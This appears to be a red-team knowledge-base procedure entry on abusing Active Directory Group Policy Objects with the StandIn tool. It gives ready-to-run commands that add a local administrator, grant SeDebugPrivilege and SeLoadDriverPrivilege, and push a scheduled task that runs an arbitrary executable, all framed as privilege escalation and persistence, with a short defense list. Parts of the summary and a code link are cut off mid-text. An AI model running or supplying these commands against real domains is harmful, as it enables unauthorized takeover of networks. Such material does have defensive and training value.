---
id: 1d31852e-9372-4dd9-8b3b-324d56aa1ae0
name: Abusing Group Policy Objects with StandIn to Manage Local Administrators and
  User Rights
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:03.753525+00:00'
updated_at: '2023-04-10T20:25:53.868787+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Impact|TA0040 - Impact]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Data Destruction|T1485 - Data Destruction]]'
- '[[Group Policy Modification|T1484 - Group Policy Modification]]'
tags:
- '[[Abuse GPO with StandIn]]'
- '[[Active Directory Attacks]]'
- '[[Exploit Group Policy Objects GPO]]'
commands:
- '[[Add local administrator with StandIn.exe]]'
- '[[Execute custom command with StandIn.exe]]'
- '[[Set custom user rights with StandIn.exe]]'
---

# Abusing Group Policy Objects with StandIn to Manage Local Administrators and User Rights

## Summary

Abusing Group Policy Objects (GPO) with StandIn is a technique used to escalate privileges and maintain persistence in an Active Directory environment. This technique involves modifying existing GPOs or creating new ones to add malicious scripts or commands that give an attacker the ability to mana

## Description

# Description

Abusing Group Policy Objects (GPO) with StandIn is a technique used to escalate privileges and maintain persistence in an Active Directory environment. This technique involves modifying existing GPOs or creating new ones to add malicious scripts or commands that give an attacker the ability to manage local administrators and user rights on targeted machines. This attack can be carried out by an attacker with access to the Active Directory environment and knowledge of GPOs. The business value of this technique is that it allows an attacker to gain and maintain access to sensitive data and systems within the target environment.

 

## Requirements

1. Access to the Active Directory environment

1. Knowledge of GPOs

1. Authentication credentials with sufficient privileges

 

## Defense

1. Regularly review and audit GPOs for any unauthorized modifications

1. Implement the principle of least privilege for user and computer accounts

1. Use tools such as Microsoft's Local Administrator Password Solution (LAPS) to manage local administrator passwords

 

## Objectives

1. Escalate privileges within the target environment

1. Maintain persistence in the target environment

1. Gain access to sensitive data and systems

 

# Instructions

1. To add a local administrator, use the command:
StandIn.exe --gpo --filter [FilterName] --localadmin [Username]

To set custom rights to a user, use the command:
StandIn.exe --gpo --filter [FilterName] --setuserrights [Username] --grant "[Right1],[Right2]"

To execute a custom command, use the command:
StandIn.exe --gpo --filter [FilterName] --tasktype computer --taskname [TaskName] --author "[AuthorName]" --command "[CommandPath]" --args "[Arguments]"

 



**Code**: [[# Add a local administrator
StandIn.exe --gpo --fi]]



> The 'StandIn.exe' command is used to manage local administrators and user rights. The '--gpo' option specifies that the command should be applied via Group Policy. The '--filter' option specifies the name of the filter to apply the command to. The '--localadmin' option adds a new local administrator with the specified username. The '--setuserrights' option sets custom rights to the specified user with the '--grant' option specifying the rights to be granted. The '--tasktype' option specifies the type of task to execute. The '--taskname' option specifies the name of the task. The '--author' option specifies the author of the task. The '--command' option specifies the path of the command to execute. The '--args' option specifies any arguments to be passed to the command.



**Command** ([[Add local administrator with StandIn.exe]]):

```bash
StandIn.exe --gpo --filter Shards --localadmin user002
```





**Command** ([[Set custom user rights with StandIn.exe]]):

```bash
StandIn.exe --gpo --filter Shards --setuserrights user002 --grant "SeDebugPrivilege,SeLoadDriverPrivilege"
```





**Command** ([[Execute custom command with StandIn.exe]]):

```bash
StandIn.exe --gpo --filter Shards --tasktype computer --taskname Liber --author "REDHOOK\Administrator" --command "C:\I\do\the\thing.exe" --args "with args"
```



## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Impact|TA0040 - Impact]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Data Destruction|T1485 - Data Destruction]]
- [[Group Policy Modification|T1484 - Group Policy Modification]]

## Commands Used

- [[Add local administrator with StandIn.exe]]
- [[Execute custom command with StandIn.exe]]
- [[Set custom user rights with StandIn.exe]]

## Tags

- [[Abuse GPO with StandIn]]
- [[Active Directory Attacks]]
- [[Exploit Group Policy Objects GPO]]


